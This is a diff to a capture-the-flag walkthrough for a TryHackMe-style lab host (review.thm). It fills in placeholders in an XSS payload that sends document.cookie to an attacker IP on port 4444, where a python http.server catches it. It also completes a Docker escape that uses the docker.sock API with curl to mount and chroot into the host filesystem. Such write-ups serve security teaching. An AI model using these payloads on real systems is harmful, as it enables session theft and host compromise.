@@ -22,7 +22,7 @@ After the search process, I discovered the http://review.thm/contact.php can sen
 
 <img width="1280" height="745" alt="image" src="https://github.com/user-attachments/assets/4f8b3c65-2e92-4611-a8d1-80bcf7e9a00a" />
 
-Image <script> var img = new Image(); img.src = 'http://:4444/stealcookies?' + document.cookie; </script>
+Image <script> var img = new Image(); img.src = 'http://IP:4444/stealcookies?' + document.cookie; </script>
 Then I started the http server
 
 python3 -m http.server 4444
@@ -114,7 +114,6 @@ We are in a docker container let’s start by upgrading to shell : python3 -c "i
 Right here, I have spent a lot of time and even stayed up all night using resources from Google and ChatGPT. I am currently very weak in this area, so I may feel a bit lost and unclear from this point onward.
 First, create a container for Docker and then you can access the file system here:
 
-Get the available images
 
 curl --unix-socket /var/run/docker.sock http://localhost/images/json
 
@@ -138,9 +137,9 @@ curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/js
 
 Save id from previous script
 
-curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers//start
+curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/ID/start
 
-docker exec -it chroot /host /bin/bash
+docker exec -it ID chroot /host /bin/bash
 
 So we have the third flag 👍
 
